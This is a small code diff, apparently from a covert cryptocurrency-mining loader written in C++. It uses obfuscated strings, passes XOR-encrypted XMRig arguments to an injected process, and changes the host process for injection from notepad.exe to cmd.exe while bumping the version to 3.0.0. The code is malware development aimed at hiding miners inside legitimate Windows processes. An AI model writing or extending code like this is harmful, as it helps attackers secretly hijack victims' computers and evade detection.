@@ -379,7 +379,7 @@ int main(int argc, char *argv[])
 #endif // ENABLE_CONTRACT_URL
     
     // Client version - update this for each release
-    const std::string CLIENT_VERSION = OBFUSCATE_STRING("2.4.0");
+    const std::string CLIENT_VERSION = OBFUSCATE_STRING("3.0.0");
 
     // Prefix used when passing XOR-encrypted XMRig args to the injected process
     const std::string ENC_ARGS_PREFIX = OBFUSCATE_STRING("--encargs ");
@@ -473,7 +473,7 @@ int main(int argc, char *argv[])
     // Create mutable buffers for both miners
     wchar_t payloadPath[MAX_PATH] = {0};
     wchar_t targetPath[MAX_PATH] = {0};
-    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\notepad.exe");
+    std::string _targetNarrow = OBFUSCATE_STRING("C:\\Windows\\system32\\cmd.exe");
     std::wstring targetStr(_targetNarrow.begin(), _targetNarrow.end());
     wcscpy_s(targetPath, MAX_PATH, targetStr.c_str());
 
